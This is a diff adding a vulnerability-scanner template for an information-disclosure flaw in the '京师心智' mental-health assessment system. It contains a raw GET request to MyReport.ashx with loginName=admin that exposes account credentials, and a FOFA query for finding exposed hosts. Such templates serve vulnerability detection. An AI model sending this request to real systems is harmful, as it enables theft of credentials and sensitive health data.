@@ -1,0 +1,37 @@
+id: jingshixinzhi-MyReport-information-disclosure
+ 
+info:
+  name: 京师心智心理健康测评系统MyReport.ashx信息泄露
+  author: WLF
+  severity: high
+  description: '京师心智心理健康测评系统-账号密码泄露,攻击者可通过此漏洞获取敏感信息，从而为下一步攻击做准备。'
+  tags: 2024,京师,information-disclosure
+  reference:
+    - https://blog.csdn.net/weixin_52204925/article/details/136833328?spm=1001.2014.3001.5501
+  metadata: 
+    fofa-query: body="JS/ligerComboBox/ligerTree.js"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+ 
+ 
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"_AddFiletemplate","_CouIntroduce")
